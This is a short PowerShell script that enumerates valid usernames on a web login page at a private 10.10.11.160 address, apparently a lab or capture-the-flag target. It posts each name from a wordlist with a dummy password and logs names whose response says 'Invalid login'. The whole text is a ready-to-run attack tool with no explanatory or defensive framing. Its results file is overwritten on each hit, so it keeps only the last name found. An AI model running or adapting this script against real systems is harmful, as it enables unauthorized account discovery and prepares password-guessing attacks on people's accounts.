#!/opt/microsoft/powershell/7/pwsh
#Autor: Conde

param(
        [Parameter(Position=0,mandatory=$true)]
        [string]$w
)

#Variables
$url="http://10.10.11.160:5000/login"
$result="ValidUsers.txt"

#Test File
if([System.IO.File]::Exists($result)){
        Remove-Item $result
}

#Main
Write-Host -Foreground blue "`n[*] Finding Valid Users `n"
gc $w | % {

        $estado=$(curl -s $url --data "username=$_&password=test" | Select-String -pattern "Invalid login")

        if ($estado){
                write-host -nonewline -Foreground green "`t[✔] User found: "; write-host -Foreground yellow $_
                $_ | out-file $result
        }
}
